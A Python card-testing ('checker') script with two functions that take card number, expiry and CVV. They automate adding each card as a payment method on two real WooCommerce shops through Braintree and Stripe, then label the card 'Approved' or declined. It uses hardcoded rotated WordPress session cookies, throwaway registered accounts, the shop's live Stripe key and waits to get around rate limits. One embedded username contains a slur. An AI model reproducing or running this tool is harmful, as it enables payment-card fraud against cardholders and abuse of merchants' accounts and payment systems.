import requests
import re
import random
import time
import string
import base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
def notauto(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
    print(n,mm,yy,cvc)
    user = generate_user_agent() 
    print(user)
    
    r=requests.session()

    last_used_times = {}

  while True:
    lines = '''eu3828728282882an44%7C1730022006%7CTWHWzJMpQjGTh0Y3BmWU3lTH2im6HwcZZ44QqF4fmQj%7C8bce456e71589127f399e66b164e7757f2e53878ba395d488f5e3bbb21902981
67eu7372hw8aman44%7C1730019608%7CChXaWU2fVH9gdVnANggbI58fDgFZ4x7kJpmUGS72ibo%7Cfa005a11895bfb139903b85f55114b6904bcd37301e0965383364e3e49e5affa
3799217813%7C1730029241%7CPvmnZfC5alKeWYJIttiL0AGPeZUC0fl49Laro56OhE6%7C48a9c5c52b6f4038aba97b4aeec67fb24b8948a68d59a141fa8b40d0a407786c
jhonsmith26622671%7C1730029397%7CY5ERfhWLvx3Hopk0jqWM8njSIfzgwwff7RWudm789Y8%7C34a93f66c1d6e0b8e3e477d0a2d47d1e26b04be191db2b3f140bc40a54cc9495
nigga67267822%7C1730029509%7CRBnxJeT4JBNCPBKiPjhvqMlq0yG1uq8I89GjBzUlBss%7Cbf5338bb0edccad41c70d9bc406a99a5cc46b4708b4f43ab3728279981395261
aksha5622277%7C1730029626%7CKyXbhINpdfgSAs6VxuU41YJYarGYVidOzR57p1EMyLm%7C4060a2fb6f2d8f86d3a535152974b350340c39479051e7b1590002a470eb7e02
leon278922%7C1730029870%7CvWYL1rEfaamcUmXo7oDaQpgMkTmgU5SaG9WrC5SI89p%7C90464af0e7ed8488956fddca65a5f10b178c6397d3a27ce09aca4c65dbf3ce4a
smkwekkweo9238292%7C1730030191%7CzUvSdDvFTLCty7W8xu0szZ88tDRJj3t3CoT4zrExzdt%7Cac5e68e06a874bd362714ef50f467be8b444c28e78def0352318aab2475d3745
koowko92772%7C1730030318%7C8gBkQBRDgVhRGL257ekr3x0fj8KVoqTHi8yvkOADJTV%7Ccff366b7efcb846bd2d4c865f843b05a81537d6d2c6edc36e238ce860bec9f52
gshdieiei8393299%7C1730030572%7CuO8q9nY1EM8dCFfe4WxlOIT5IhkMEx3UjcYfa7rsQ3a%7C331f2436f9aa287ee757b675eccbdaaeb1ce54d0196c6143ba3a3c266121ad87
ameueuruidiran44%7C1730030711%7CospFKPqQJa68nrRjzx4lR3NSr8EaoGLgHlYlxrfYvFj%7Ca263169698f8d67f31b2c25183766e1936353593b5205c6c3aa38d2497b8986d
amuue8e822an44%7C1730032845%7C3NL7zXGafMAdVJRIS5542kdKnKU9T1PFjoNbBFBRYBW%7Ce08896341b2dbdf69073fcfb3451645c6e405f6aa5728f453254bd8633253a51'''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
            time_since_last_use = current_time - last_used_times[big]
            if time_since_last_use < 20:

                continue
    if big == first_line:
      pass
    else:
        last_used_times[big] = current_time
        break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    print(big)
  cookies = {
    '_gcl_au': '1.1.1863826453.1728802282',
    '_gid': 'GA1.2.967594922.1728802283',
    '_clck': 'jwe9yb%7C2%7Cfpz%7C0%7C1747',
    'brandcdn_uid': 'ab148ebe-5de7-4f42-8d37-9217049e9e52',
    'tk_ai': 'JIfROvUSUaJraik9IIrIp5EI',
    '__utmzz': 'utmccn=(not set)',
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': big,
    'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'ab2hwyethtgxqzut080b',
    'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '8010%7Cother%7Cread%7Cf695110a37a89c69396016408608bb3198b7274a70a333bdf2f437049ffd6cfb',
    'wp_automatewoo_session_started': '1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
    'sbjs_first_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '__utmzzses': '1',
    '_gat_UA-2829389-2': '1',
    '_gat_UA-2829389-1': '1',
    'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fpayment-methods%2F',
    '_ga_JT1Y3HZ65M': 'GS1.1.1728807005.2.1.1728808703.0.0.0',
    '_ga': 'GA1.2.1852455351.1728802283',
    '_clsk': '1wqnafk%7C1728808704723%7C10%7C1%7Ca.clarity.ms%2Fcollect',
    '_uetsid': '8ed70770892f11ef88335775011a296c',
    '_uetvid': '8ed7ad20892f11efb54c5fabb712f3ef',
    'tk_qs': '',
}

  headers = {
    'authority': 'www.yazoomills.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',    
    'referer': 'https://www.yazoomills.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  response = requests.get('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  print(add_nonce)
  client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
  print(client)
  
  
  cookies = {
    'wordpress_sec_29d4bb5994f0ca859e9db957c5c93aee'
    '_gcl_au': '1.1.1863826453.1728802282',
    '_gid': 'GA1.2.967594922.1728802283',
    '_clck': 'jwe9yb%7C2%7Cfpz%7C0%7C1747',
    'brandcdn_uid': 'ab148ebe-5de7-4f42-8d37-9217049e9e52',
    'tk_ai': 'JIfROvUSUaJraik9IIrIp5EI',
    '__utmzz': 'utmccn=(not set)',
    'wp_automatewoo_session_started': '1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
    'sbjs_first_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '__utmzzses': '1',
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': big,
    'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'ewr16eyxsvhttc2bwjka',
    'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '8011%7Cother%7Cread%7Ca97e49c0eb8b33fe0637541a3dd1e993e98fb467b57e4cb0e84033bd832eae9f',
    'tk_qs': '',
    '_ga': 'GA1.2.1852455351.1728802283',
    '_uetsid': '8ed70770892f11ef88335775011a296c',
    '_uetvid': '8ed7ad20892f11efb54c5fabb712f3ef',
    '_clsk': '1wqnafk%7C1728811036924%7C30%7C1%7Ca.clarity.ms%2Fcollect',
    '_ga_JT1Y3HZ65M': 'GS1.1.1728807005.2.1.1728811126.0.0.0',
    'sbjs_session': 'pgs%3D35%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
}
  

  headers = {
    'authority': 'www.yazoomills.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',    
    'origin': 'https://www.yazoomills.com',
    'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
  data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client,
}  
  response = requests.post('https://www.yazoomills.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

  ec=(response.json()['data'])

  dec = base64.b64decode(ec).decode('utf-8')

  au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
  print(au)

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'b999d21a-7c58-4a1b-bd9a-6ef95ef8e6d5',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  tok = response.json()['data']['tokenizeCreditCard']['token']
  print(tok)

  cookies = {
    '_gcl_au': '1.1.1863826453.1728802282',
    '_gid': 'GA1.2.967594922.1728802283',
    '_clck': 'jwe9yb%7C2%7Cfpz%7C0%7C1747',
    'brandcdn_uid': 'ab148ebe-5de7-4f42-8d37-9217049e9e52',
    'tk_ai': 'JIfROvUSUaJraik9IIrIp5EI',
    '__utmzz': 'utmccn=(not set)',
    'wordpress_logged_in_29d4bb5994f0ca859e9db957c5c93aee': big,
    'wp_automatewoo_visitor_29d4bb5994f0ca859e9db957c5c93aee': 'ab2hwyethtgxqzut080b',
    'wfwaf-authcookie-353b44fd2d0fa5951e3540788f9b2103': '8010%7Cother%7Cread%7Cf695110a37a89c69396016408608bb3198b7274a70a333bdf2f437049ffd6cfb',
    'wp_automatewoo_session_started': '1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
    'sbjs_first_add': 'fd%3D2024-10-13%2008%3A08%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '__utmzzses': '1',
    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.yazoomills.com%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
    '_uetsid': '8ed70770892f11ef88335775011a296c',
    '_uetvid': '8ed7ad20892f11efb54c5fabb712f3ef',
    '_ga_JT1Y3HZ65M': 'GS1.1.1728807005.2.1.1728808858.0.0.0',
    '_ga': 'GA1.2.1852455351.1728802283',
    '_gat_UA-2829389-2': '1',
    '_gat_UA-2829389-1': '1',
    '_clsk': '1wqnafk%7C1728808862562%7C12%7C1%7Ca.clarity.ms%2Fcollect',
}

  headers = {
    'authority': 'www.yazoomills.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',    
    'origin': 'https://www.yazoomills.com',
    'referer': 'https://www.yazoomills.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '{"correlation_id":"dfe60bc8114bbfb8101bbf5af294ff27"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

  response = requests.post('https://www.yazoomills.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
  text=response.text
  html_text=response.text
  soup = BeautifulSoup(html_text, 'html.parser')
  try:
    error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
    status_code_start = error_message.find('Status code') + len('Status code')
    status_code_end = error_message.find('</div>')
    result = error_message[status_code_start:status_code_end]
  except:
    result=text
    if 'Payment method successfully added.' in text or 'Invalid postal code' in text:
      result = "1000: Approved"  # Indentation fixed here
    elif 'risk_threshold' in text:
      result = "RISK: Retry this BIN later."
    elif 'Please wait for 20 seconds' in text:
      result = "RISK"
    else:
      pass
  if 'avs' in result or '1000: Approved' in result or 'Invalid postal' in result or 'Insufficient Funds' in result:

    return 'Approved'
  else:

    return result
    
    
    
import requests
import re
import random
import string
import base64
from getuseragent import UserAgent
from user_agent import generate_user_agent

def Tele3(ccx):
    ccx = ccx.strip()
    parts = re.split(r'[ |/]', ccx)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    print(n, mm, yy, cvc)

    r = requests.session()
    user = generate_user_agent()

    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"
    acc = generate_random_account()

    def username():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=20))
        return f"{name}{number}"
    username = username()

    def generate_random_code(length=32):
        letters_and_digits = string.ascii_letters + string.digits
        return ''.join(random.choice(letters_and_digits) for _ in range(length))

    corr = generate_random_code()
    sess = generate_random_code()

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User ': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User -Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    response = r.get('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers)

    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

    headers = {
        'authority': 'aptekaleki24.co.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://aptekaleki24.co.uk',
        'referer': 'https://aptekaleki24.co.uk/my-account-2',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    data = {
        'email': acc,
        'privacy_policy': 'on',
        'woocommerce-register-nonce': register,
        '_wp_http_referer': '/my-account-2',
        'register': 'Zarejestruj się',
    }

    response = r.post('https://aptekaleki24.co.uk/my-account-2', cookies=r.cookies, headers=headers, data=data)

    headers = {
        'authority': 'aptekaleki24.co.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://aptekaleki24.co.uk/my-account-2/payment-methods',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }

    response = r.get('https://aptekaleki24.co.uk/my-account-2/add-payment-method', cookies=r.cookies, headers=headers)

    nonce = re.findall(r'"add_card_nonce":"(.*?)"', response.text)[0]
    print(nonce)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }

    data = f'type=card&billing_details[name]=+&billing_details[email]=makk2882%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=07085d6f-c819-4cc2-bf19-bbd3c19e0b4ec756b1&muid=b0cef40a-e0b4-4f5f-8b68-ae5c25ed66fb0f87ec&sid=27d86006-21ea-4836-87aa-f33def9368bbb523ef&pasted_fields=number&payment_user_agent=stripe.js%2F8f1da5bf41%3B+stripe-js-v3%2F8f1da5bf41%3B+card-element&referrer=https%3A%2F%2Faptekaleki24.co.uk&time_on_page=50390&key=pk_live_51IQzDCBKZpsKrCkNMyqzdD1smhnXungJIcpefiOevrq8VOUZc4YE2ehVLdUr6NMTqMWzY5bA3d3o9petmZSoOyvU00u8Awtmy3&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoibENSc09Jbjd6MU1BZDRtaDZVcE1TbUVEMVAra2RzS0RSelhrZDVPWVlHdmMvTVg5N0haeUN1SnEraDdsazhER01GdGNMYmFyTkg2Z1NlSWpsNzQwcTVDTG80OXJvcHZWclFZTUpIRExJYVVWd0Q3cHdtVWZDTVQxQURHM2NLRi9pMU96WFo4Umd4Q1pmLzJPb2F2RHRvK2lUS0ZsL2RDdlV5dXFyL1owSXZManAzT0JRSXNhVGlvS3cwRENyc0xkeXR1TURjYzZyem1XUEEvdkhGMWRLUTMwb2k5MUhHRnFoR1pNWWVsNUpwWGpsNWFLZmltZjBuREZjNHJCUWJDOXlHMFlRTUFoc281MUpvQjBRS0lJK0JRVHRFWjhGUld1QlRhcFp4WkFlQ3prSUpYejVUeldBTEZyYlpiRnBienErRC9ML0IyUllIN25xdGFkVXpEK2pFTE5rU29HY0kvL29pbXBMYzA4MkdGK3FKanpjTFlqYmt1U0JrbnZNazdzM0RTWHhWZzl4OE04KzcvWmNqRC96WE VaQStVZ jdYQVpUcXV5TmZFeXVkZjRDRGUvdy9GakxQSnJnOWpMck04VE0xY2x4blJ1T0V5dWlQdTMxZUJabkk1TXRtcHNSRUVtYUZvVFl5WHVSZW1xNTBBdEphNUxLQjlCZGxneHRDMFozbExlU1Z0ZFNqNFFqZXI3cXVUOGhoWEd2T0dwdzhzYVB4bkV3bHBNbHU0ckNDR1NqN2tNVDRSS3BZUVZXeVZobnRtcGZ6VjhrL243S0lZeUhrZFFRZDhsVmxxNmtxSEt2THNaNzNIZVEzUUFEbnpRS1pRL3NYUm9xYUh3TWFJOW5wcDNOeXZ4VmNEMzhhNngzcjVLMnl5U3RxSVBFSWhhMjJkdDJVazlFemk4UmNTYXpiODhpY3NLdHdTbGlRa1ErbmpWSW9zMFJhdGlpUnV2anNlNU9BbStLMjRDeVo3Sys0M3BNaE1ib2hPWGIvYjlYOGFJcUtkM1Zxa1c0a0ZIVTJ6MFNQSTE5ZFVOWEZ3SFowa1Q3dlc0ckhjdVZ6NVFqMGFkbFg1RVdQYXhWRU1wQURvRVltdmVwbUZPRGd3azFXL2JTb2NSak5QTE5YbjNDL3Y3UXNzZFR1R0Rxb2pHNXlYeWZLL25USXNZeThMeW9Id1hEbFU1cXlKUkQ4ZXFOYmJjU1hkZmNnMk91UTlHYnhoYWk4b3pXcG5IY1dZRC9rdXlBb0ljRk94eDErT0VmMS9CajcxRUQwN1VldC9rRlFLZFd4a0xwZ1NPQ0U5Vkd5OGR3TnN5OGt3N2x4QjJEU1FtVXJLK1lFUjdpRWl2MnhIREpvMHdRdkpVYVpkYzBOcVpNRk9JNU5rUkdVSkF5UFJ2cnpRQXhqUmJ2MmZmT1ZvWExuWFFBL2FldUgzMEdHaGIraFd5em1RblNLOXRIeGtTWU5NNFRmNjg5NGJUNG1KSVVwdlZsTy9jRkpSUXA1UE5ZUWQyWCtkbHVxMmhzd0ZRY212SnhEZWxKQzhjNjV3djFRTi9rcXNxZWI0OGExWU9FSjNZU2Q5T3ZudmlMczRqRk9HTjFJMFFNUXBhRUFtU3AvRldxRGxuS1dhbUg3VnM1ZFN5S2Z0cWZXa2xGczhwSWRBMGJCL1FHVnpKbzFQMWVlYW1Ia2FPeERSMDlKd09sL1kvSG81T3lyQ2ZwZUJoWWFpa0s2MVFoR1lROWJWL3d3bUJjcnRvc3NxUlZrU25nRk80bnpveC9QZjNWUU5ZbG5EOENpaEFxOW5GQXBwNTZzcm5odzVZcVZNU1lPYUFhWnB4M1UwVWNGUS9ibHBpei9rUTZaY25TRTIxN3ZaYzRtVUszYVV6aWd6WHY5ZkZmYUVpTGF6MHN3RWdJSEU2a25WbmtLMHFUQ1FSWTArUlU3VGh1'

    response = requests .post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    if not 'id' in response.json():
        print('ERORR CARD')
    else:
        id = response.json()['id']
        print(id)

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://aptekaleki24.co.uk',
        'referer': 'https://aptekaleki24.co.uk/my-account-2/add-payment-method',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
    }

    data = {
        'stripe_source_id': id,
        'nonce': nonce,
    }
    try:
        response = r.post('https://aptekaleki24.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
        i = (response.json()['error']['message'])
        print(i)
        return i
    except:
        print(response.json()['status'])
        return 'Approved'
